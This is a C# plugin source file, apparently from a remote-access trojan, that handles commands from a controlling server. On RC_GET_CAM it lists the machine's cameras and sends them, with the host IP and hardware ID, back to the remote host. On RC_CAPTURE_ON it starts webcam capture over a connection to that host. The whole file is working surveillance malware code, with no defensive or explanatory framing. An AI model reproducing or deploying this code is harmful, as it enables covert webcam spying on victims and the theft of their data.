using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        internal static ClientHandler clientHandler;
        internal static bool cameraCapture;

        internal static RemoteCameraCapturePacket remoteCameraCapturePacket;
        public static void Main(LoadingAPI loadingAPI)
        {
            cameraCapture = false;
            switch (loadingAPI.CurrentPacket.PacketType)
            {
                case PacketType.RC_GET_CAM:
                    ClientHandler clientHandlerGetCam = new ClientHandler(loadingAPI.Host, loadingAPI.Key, loadingAPI.BaseIp, loadingAPI.HWID);
                    clientHandlerGetCam.ConnectStart();
                    RemoteCameraPacket remoteCameraPacket = new RemoteCameraPacket(GetCameras.GetListCameras(), loadingAPI.BaseIp, loadingAPI.HWID);
                    while (!clientHandlerGetCam.Connected)
                        Thread.Sleep(125);
                    clientHandlerGetCam.SendPacket(remoteCameraPacket);
                    break;

               case PacketType.RC_CAPTURE_ON:
                    cameraCapture = true;
                    remoteCameraCapturePacket = (RemoteCameraCapturePacket)loadingAPI.CurrentPacket;
                    clientHandler = new ClientHandler(loadingAPI.Host, loadingAPI.Key, loadingAPI.BaseIp, loadingAPI.HWID);
                    clientHandler.ConnectStart();
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }
    }
}
